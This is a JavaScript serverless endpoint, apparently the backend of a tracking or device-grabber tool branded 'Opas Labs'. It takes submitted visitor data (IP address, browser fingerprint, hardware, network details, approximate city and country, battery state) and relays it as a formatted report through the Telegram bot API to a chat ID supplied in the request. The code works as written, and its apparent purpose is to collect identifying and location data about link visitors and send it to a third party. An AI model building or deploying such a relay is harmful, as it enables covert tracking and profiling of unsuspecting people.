export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, ...deviceInfo } = req.body;
    
    // Build the message dynamically
    const messageParts = [];
    
    // Header
    messageParts.push(
      `🔰 *Opas Labs - Data Report* 🔰`,
      `🆔 Chat ID: ${telegramId}`,
      `🕒 Time: ${new Date().toLocaleString()}`,
      `🌐 IP: ${deviceInfo.ip || 'Unknown'} (Approximate location)`
    );

    // Browser Info
    if (deviceInfo.browser || deviceInfo.platform) {
      messageParts.push(`\n*🌐 Browser Info*`);
      if (deviceInfo.browser) messageParts.push(`- User Agent: ${deviceInfo.browser}`);
      if (deviceInfo.platform) messageParts.push(`- Platform: ${deviceInfo.platform}`);
      if (deviceInfo.language) messageParts.push(`- Language: ${deviceInfo.language}`);
      if (deviceInfo.timezone) messageParts.push(`- Timezone: ${deviceInfo.timezone}`);
    }

    // Hardware
    if (deviceInfo.cpu || deviceInfo.memory || deviceInfo.screen) {
      messageParts.push(`\n*💻 Hardware*`);
      if (deviceInfo.cpu) messageParts.push(`- CPU: ${deviceInfo.cpu}`);
      if (deviceInfo.memory) messageParts.push(`- RAM: ${deviceInfo.memory}`);
      if (deviceInfo.screen) messageParts.push(`- Screen: ${deviceInfo.screen}`);
      if (deviceInfo.webgl) {
        messageParts.push(`- WebGL: ${deviceInfo.webgl.vendor || 'Unknown'} | ${deviceInfo.webgl.renderer || 'Unknown'}`);
      }
    }

    // Network
    if (deviceInfo.network) {
      messageParts.push(`\n*📶 Network*`);
      if (deviceInfo.network.type) messageParts.push(`- Type: ${deviceInfo.network.type}`);
      if (deviceInfo.network.effectiveType) messageParts.push(`- Speed: ${deviceInfo.network.effectiveType}`);
      if (deviceInfo.network.downlink) messageParts.push(`- Downlink: ${deviceInfo.network.downlink} Mbps`);
      if (deviceInfo.network.rtt) messageParts.push(`- Latency: ${deviceInfo.network.rtt} ms`);
      if (deviceInfo.network.saveData !== undefined) {
        messageParts.push(`- Data Saver: ${deviceInfo.network.saveData ? 'On' : 'Off'}`);
      }
    }

    // Location (IP-based only)
    if (deviceInfo.city || deviceInfo.region || deviceInfo.country) {
      messageParts.push(`\n*📍 Approximate Location*`);
      if (deviceInfo.city) messageParts.push(`- City: ${deviceInfo.city}`);
      if (deviceInfo.region) messageParts.push(`- Region: ${deviceInfo.region}`);
      if (deviceInfo.country) messageParts.push(`- Country: ${deviceInfo.country}`);
    }

    // Battery
    if (deviceInfo.battery || deviceInfo.charging !== undefined) {
      messageParts.push(`\n*🔋 Battery*`);
      if (deviceInfo.battery) messageParts.push(`- Level: ${deviceInfo.battery}%`);
      if (deviceInfo.charging !== undefined) {
        messageParts.push(`- Charging: ${deviceInfo.charging ? 'Yes' : 'No'}`);
      }
    }

    // Join all parts and send
    const messageText = messageParts.join('\n');
    
    // Send to Telegram
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramId,
          text: messageText,
          parse_mode: 'Markdown'
        })
      }
    );

    if (!telegramResponse.ok) {
      throw new Error('Telegram API error');
    }

    res.status(200).json({ success: true });

  } catch (error) {
    console.error('Error processing submission:', error);
    res.status(500).json({ 
      error: 'Failed to process data',
      details: error.message 
    });
  }
};
